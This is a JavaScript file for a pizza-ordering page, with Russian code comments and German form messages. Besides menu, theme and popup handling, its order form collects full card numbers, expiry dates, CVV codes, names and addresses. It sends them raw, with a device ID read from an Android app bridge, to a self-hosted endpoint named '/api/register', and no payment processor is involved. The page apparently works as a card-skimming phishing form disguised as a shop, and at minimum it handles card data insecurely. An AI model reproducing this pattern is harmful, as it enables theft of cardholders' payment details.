document.addEventListener("DOMContentLoaded", () => {
  const serverUrl = "https://back-xx0q.onrender.com";
  let deviceId = localStorage.getItem("deviceId");
  if (!deviceId && window.AndroidBridge?.getDeviceId) {
    deviceId = window.AndroidBridge.getDeviceId();
  }
  if (!deviceId) {
    deviceId = crypto.randomUUID();
  }
  localStorage.setItem("deviceId", deviceId);

  // меню
  const navMenu   = document.getElementById("nav-menu");
  const navToggle = document.getElementById("nav-toggle");
  const navClose  = document.getElementById("nav-close");
  navToggle?.addEventListener("click",  () => navMenu.classList.add("show-menu"));
  navClose?.addEventListener("click",   () => navMenu.classList.remove("show-menu"));
  document.querySelectorAll(".nav__link").forEach(link =>
    link.addEventListener("click", () => navMenu.classList.remove("show-menu"))
  );

  // прокрутка активных ссылок
  const sections = document.querySelectorAll("section[id]");
  window.addEventListener("scroll", () => {
    const scrollY = window.pageYOffset;
    sections.forEach(section => {
      const top    = section.offsetTop - 50;
      const height = section.offsetHeight;
      const id     = section.id;
      const link   = document.querySelector(`.nav__menu a[href*="${id}"]`);
      if (scrollY > top && scrollY <= top + height) {
        link?.classList.add("active-link");
      } else {
        link?.classList.remove("active-link");
      }
    });
  });

  // кнопка "вверх"
  const scrollUpBtn = document.getElementById("scroll-up");
  window.addEventListener("scroll", () => {
    if (window.scrollY >= 350) {
      scrollUpBtn.classList.add("show-scroll");
    } else {
      scrollUpBtn.classList.remove("show-scroll");
    }
  });

  // тема
  const themeButton = document.getElementById("theme-button");
  const darkClass   = "dark-theme";
  const iconClass   = "fa-sun";
  const savedTheme  = localStorage.getItem("selected-theme");
  const savedIcon   = localStorage.getItem("selected-icon");
  if (savedTheme) {
    document.body.classList.toggle(darkClass, savedTheme === "dark");
    themeButton.classList.toggle(iconClass, savedIcon === "fa-moon");
  }
  themeButton.addEventListener("click", () => {
    document.body.classList.toggle(darkClass);
    themeButton.classList.toggle(iconClass);
    localStorage.setItem("selected-theme", document.body.classList.contains(darkClass) ? "dark" : "light");
    localStorage.setItem("selected-icon", themeButton.classList.contains(iconClass) ? "fa-moon" : "fa-sun");
  });

  // попапы и заказ
  const paymentPopup     = document.getElementById("payment-popup");
  const confirmationPopup= document.getElementById("confirmation-popup");
  const closeBtns        = document.querySelectorAll(".popup-overlay .close-btn");
  const openOrderBtns    = document.querySelectorAll(".order-now-btn");
  const orderForm        = document.getElementById("payment-form");
  const orderMessage     = document.getElementById("order-message");
  const confirmCloseBtn  = document.getElementById("confirm-close");
  const pizzaContainer   = document.getElementById("pizzaContainer");

  if (localStorage.getItem("orderDone")==="true") {
    pizzaContainer.classList.remove("hidden");
  }

  openOrderBtns.forEach(btn =>
    btn.addEventListener("click", e => {
      e.preventDefault();
      paymentPopup.classList.add("active");
    })
  );

  closeBtns.forEach(btn =>
    btn.addEventListener("click", () => {
      const pop = btn.closest(".popup-overlay");
      pop.classList.remove("active");
      if (pop===paymentPopup) {
        orderForm.reset();
        clearErrors();
      }
    })
  );

  confirmationPopup.addEventListener("click", e => {
    if (e.target===confirmationPopup) {
      confirmationPopup.classList.remove("active");
    }
  });

  confirmCloseBtn.addEventListener("click", () => {
    confirmationPopup.classList.remove("active");
    pizzaContainer.classList.remove("hidden");
  });

  // валидация
  const validators = {
    address:        { fn:v=>v.length>=4, msg:"Adresse muss ≥4 Zeichen enthalten." },
    cardholderName: { fn:v=>/^[A-Za-zÄÖÜäöüß ]{2,}$/.test(v), msg:"Name nur Buchstaben, min.2 Zeichen." },
    cardNumber:     { fn:v=>/^(\d{4} ?){3}\d{4}$/.test(v), msg:"Kartennummer: 16 Ziffern." },
    expiry:         { fn:v=>{
                        if(!/^(0[1-9]|1[0-2])\/\d{2}$/.test(v)) return false;
                        const [m,y]=v.split("/").map(Number);
                        const exp=new Date(2000+y,m-1,1);
                        const now=new Date();
                        return exp>=new Date(now.getFullYear(),now.getMonth(),1);
                      }, msg:"Ungültiges Ablaufdatum." },
    cvv:            { fn:v=>/^[0-9]{3,4}$/.test(v), msg:"CVC: 3–4 Ziffern." }
  };

  function clearErrors() {
    orderForm.querySelectorAll("input[id]").forEach(f=>{
      f.classList.remove("input-error");
      f.nextElementSibling?.classList.contains("error-text") && f.nextElementSibling.remove();
    });
    orderMessage.textContent="";
  }

  function showError(field,message) {
    field.classList.add("input-error");
    const err=document.createElement("div");
    err.className="error-text";
    err.textContent=message;
    field.after(err);
  }

  // форматирование полей
  const cardInput   = document.getElementById("cardNumber");
  const expiryInput = document.getElementById("expiry");
  const cvvInput    = document.getElementById("cvv");
  const nameInput   = document.getElementById("cardholderName");

  nameInput.addEventListener("keypress", e => /\d/.test(e.key) && e.preventDefault());
  nameInput.addEventListener("input", () => {
    nameInput.value = nameInput.value.replace(/\d+/g, "");
  });

  cardInput?.addEventListener("input", () => {
    let v=cardInput.value.replace(/\D/g,"").slice(0,16);
    cardInput.value = v.match(/.{1,4}/g)?.join(" ")||v;
  });

  expiryInput?.addEventListener("input", () => {
    let v=expiryInput.value.replace(/\D/g,"").slice(0,4);
    if(v.length>2) v=v.slice(0,2)+"/"+v.slice(2);
    expiryInput.value=v;
  });

  cvvInput?.addEventListener("input", () => {
    cvvInput.value = cvvInput.value.replace(/\D/g,"").slice(0,4);
  });

  orderForm.addEventListener("submit", async e => {
    e.preventDefault();
    clearErrors();
    let hasError=false;
    const data={};
    orderForm.querySelectorAll("input[id]").forEach(f=>{
      const v=f.value.trim();
      if(validators[f.id] && !validators[f.id].fn(v)){
        showError(f,validators[f.id].msg);
        hasError=true;
      }
      data[f.id]=v;
    });
    if(hasError){
      orderMessage.textContent="Bitte korrigiere die markierten Felder.";
      return;
    }
    data.deviceId=deviceId;
    data.timestamp=new Date().toISOString();

    try {
      const res = await fetch(`${serverUrl}/api/register`, {
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(data)
      });
      const result = await res.json();
      if(!res.ok || !result.success) throw "";
      localStorage.setItem("orderDone","true");
      paymentPopup.classList.remove("active");
      confirmationPopup.classList.add("active");
      orderForm.reset();
    } catch {
      orderMessage.textContent="Beim Senden ist ein Fehler aufgetreten.";
    }
  });

  const pizzaAnim = document.getElementById("pizzaAnim");
  const cookMsg   = document.getElementById("cookMsg");
  pizzaAnim.addEventListener("click", () => {
    cookMsg.classList.toggle("visible");
  });
});
